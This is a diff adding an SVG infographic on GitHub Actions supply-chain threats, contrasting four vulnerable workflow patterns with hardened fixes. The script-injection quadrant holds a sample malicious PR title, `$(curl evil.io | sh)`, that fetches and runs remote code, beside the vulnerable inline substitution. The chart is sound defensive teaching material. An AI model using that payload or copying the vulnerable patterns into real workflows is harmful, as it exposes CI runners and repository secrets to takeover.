@@ -1,0 +1,91 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 540" width="960" height="540">
+  <defs>
+    <style>
+      .bg { fill: #080c14; }
+      .title { font-family: 'Inter', system-ui, sans-serif; font-weight: 700; font-size: 20px; fill: #f8fafc; }
+      .subtitle { font-family: 'Inter', system-ui, sans-serif; font-size: 13px; fill: #94a3b8; }
+      .panel { fill: #0f172a; stroke-width: 1.6; rx: 10px; }
+      .bad { fill: #1c1016; stroke: #f43f5e; stroke-width: 1.2; rx: 6px; }
+      .good { fill: #0d211c; stroke: #34d399; stroke-width: 1.2; rx: 6px; }
+      .txt-hdr { font-family: 'Inter', system-ui, sans-serif; font-weight: 700; font-size: 13px; fill: #f8fafc; }
+      .txt-sub { font-family: 'Inter', system-ui, sans-serif; font-size: 10.5px; fill: #94a3b8; }
+      .mono { font-family: 'JetBrains Mono', Consolas, monospace; font-size: 10px; font-weight: 600; }
+    </style>
+  </defs>
+
+  <rect width="960" height="540" class="bg" rx="14"/>
+  <text x="480" y="32" text-anchor="middle" class="title">GitHub Actions Threat Model &amp; Supply-Chain Defenses</text>
+  <text x="480" y="52" text-anchor="middle" class="subtitle">Four critical CI/CD attack vectors and the hardened engineering pattern that neutralizes each one</text>
+
+  <!-- Quadrant 1: Script Injection -->
+  <g transform="translate(32, 78)">
+    <rect x="0" y="0" width="440" height="212" class="panel" stroke="#f43f5e"/>
+    <text x="16" y="24" class="txt-hdr" fill="#fda4af">1. Expression Script Injection</text>
+    <text x="424" y="24" text-anchor="end" class="txt-sub">Untrusted PR title / branch in run:</text>
+
+    <rect x="14" y="38" width="412" height="72" class="bad"/>
+    <text x="24" y="56" class="mono" fill="#f43f5e">VULNERABLE: Direct inline substitution</text>
+    <text x="24" y="74" class="mono" fill="#fecdd3">run: echo "${{ github.event.pull_request.title }}"</text>
+    <text x="24" y="94" class="txt-sub">PR title `$(curl evil.io | sh)` executes in runner shell!</text>
+
+    <rect x="14" y="120" width="412" height="78" class="good"/>
+    <text x="24" y="138" class="mono" fill="#34d399">HARDENED: Pass via env: + quote "$VAR"</text>
+    <text x="24" y="156" class="mono" fill="#a7f3d0">env: { PR_TITLE: ${{ github.event.pull_request.title }} }</text>
+    <text x="24" y="172" class="mono" fill="#a7f3d0">run: printf '%s\n' "$PR_TITLE"</text>
+    <text x="24" y="188" class="txt-sub">Shell treats env variable strictly as inert data string.</text>
+  </g>
+
+  <!-- Quadrant 2: Pwn Request -->
+  <g transform="translate(488, 78)">
+    <rect x="0" y="0" width="440" height="212" class="panel" stroke="#f59e0b"/>
+    <text x="16" y="24" class="txt-hdr" fill="#fcd34d">2. Pwn Request (pull_request_target)</text>
+    <text x="424" y="24" text-anchor="end" class="txt-sub">Fork code running with repo secrets</text>
+
+    <rect x="14" y="38" width="412" height="72" class="bad"/>
+    <text x="24" y="56" class="mono" fill="#f43f5e">VULNERABLE: Checkout fork HEAD under privileged trigger</text>
+    <text x="24" y="74" class="mono" fill="#fecdd3">on: pull_request_target + ref: pull_request.head.sha</text>
+    <text x="24" y="94" class="txt-sub">Untrusted PR tests gain write token &amp; repository secrets.</text>
+
+    <rect x="14" y="120" width="412" height="78" class="good"/>
+    <text x="24" y="138" class="mono" fill="#34d399">HARDENED: Two-Workflow Isolation</text>
+    <text x="24" y="156" class="mono" fill="#a7f3d0">1) on: pull_request (no secrets) -&gt; upload-artifact</text>
+    <text x="24" y="172" class="mono" fill="#a7f3d0">2) on: workflow_run (privileged) -&gt; comment/label only</text>
+    <text x="24" y="188" class="txt-sub">Never execute untrusted fork scripts with secrets present.</text>
+  </g>
+
+  <!-- Quadrant 3: Mutable Tag Hijacking -->
+  <g transform="translate(32, 306)">
+    <rect x="0" y="0" width="440" height="212" class="panel" stroke="#38bdf8"/>
+    <text x="16" y="24" class="txt-hdr" fill="#7dd3fc">3. Third-Party Action Tag Hijacking</text>
+    <text x="424" y="24" text-anchor="end" class="txt-sub">Compromised upstream @vN tag</text>
+
+    <rect x="14" y="38" width="412" height="72" class="bad"/>
+    <text x="24" y="56" class="mono" fill="#f43f5e">RISKY: Mutable Git tag or branch pointer</text>
+    <text x="24" y="74" class="mono" fill="#fecdd3">uses: third-party/setup-tool@v2</text>
+    <text x="24" y="94" class="txt-sub">Upstream attacker can silently force-push v2 to steal secrets.</text>
+
+    <rect x="14" y="120" width="412" height="78" class="good"/>
+    <text x="24" y="138" class="mono" fill="#34d399">HARDENED: Pin Immutable 40-char Commit SHA</text>
+    <text x="24" y="156" class="mono" fill="#a7f3d0">uses: third-party/setup-tool@b4ffde65... # v2.1.3</text>
+    <text x="24" y="172" class="mono" fill="#a7f3d0">+ Dependabot package-ecosystem: "github-actions"</text>
+    <text x="24" y="188" class="txt-sub">Cryptographic SHA cannot be altered without breaking ref.</text>
+  </g>
+
+  <!-- Quadrant 4: Over-Privileged GITHUB_TOKEN -->
+  <g transform="translate(488, 306)">
+    <rect x="0" y="0" width="440" height="212" class="panel" stroke="#a855f7"/>
+    <text x="16" y="24" class="txt-hdr" fill="#d8b4fe">4. Over-Privileged GITHUB_TOKEN</text>
+    <text x="424" y="24" text-anchor="end" class="txt-sub">Excessive repository write blast radius</text>
+
+    <rect x="14" y="38" width="412" height="72" class="bad"/>
+    <text x="24" y="56" class="mono" fill="#f43f5e">RISKY: Omitting permissions: block (legacy write-all)</text>
+    <text x="24" y="74" class="mono" fill="#fecdd3"># Token can push code, releases, and packages</text>
+    <text x="24" y="94" class="txt-sub">Compromised build step can tamper with tags or main repo.</text>
+
+    <rect x="14" y="120" width="412" height="78" class="good"/>
+    <text x="24" y="138" class="mono" fill="#34d399">HARDENED: Explicit Top-Level &amp; Job Scopes</text>
+    <text x="24" y="156" class="mono" fill="#a7f3d0">permissions: {}  # Zero default permissions at top</text>
+    <text x="24" y="172" class="mono" fill="#a7f3d0">jobs.test.permissions: { contents: read }</text>
+    <text x="24" y="188" class="txt-sub">Grant write scopes ONLY on the exact job that needs them.</text>
+  </g>
+</svg>
